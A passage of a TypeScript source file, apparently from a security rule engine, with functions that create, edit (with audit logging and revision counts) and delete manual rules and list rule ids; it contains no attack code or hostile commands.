  return r
}

export function createManualRuleFull(p: { name: string; description: string; severity: Severity; expr: string; tier: Tier; allow: string[] }) {
  const r = mkRule({ ruleType: 'manual', name: p.name, description: p.description, severity: p.severity, expr: p.expr, tier: p.tier, allow: p.allow })
  manualRules.push(r)
  return r
}

/** 编辑人工规则元信息（人工权威，记录审计） */
export function updateManualRule(ruleId: string, patch: { name?: string; description?: string; severity?: Severity; expr?: string; tier?: Tier; allow?: string[] }) {
  const r = manualRules.find((x) => x.ruleId === ruleId)
  if (!r) return null
  if (patch.name) r.name = patch.name
  if (patch.description !== undefined) r.description = patch.description
  if (patch.severity) r.severity = patch.severity
  if (patch.expr !== undefined) r.expression = patch.expr
  if (patch.tier) r.actionPolicy.maxTier = patch.tier
  if (patch.allow) r.actionPolicy.allow = patch.allow
  r.updatedAt = Date.now()
  r.revision += 1
  r.audit.push({ ts: Date.now(), op: 'human.edit', by: '安全员-陈工', note: '人工修改规则属性' })
  return r
}

/** 删除人工规则（仅人工可删） */
export function deleteRule(ruleId: string) {
  const i = manualRules.findIndex((x) => x.ruleId === ruleId)
  if (i < 0) return false
  manualRules.splice(i, 1)
  return true
}

/** 供 rules 页刷新判重：返回所有规则 id 集合 */
export function allRuleIds(): Set<string> {
  return new Set([...manualRules, ...derivedRules].map((r) => r.ruleId))
}

export const getEvolveEnabled = () => evolutionEnabled
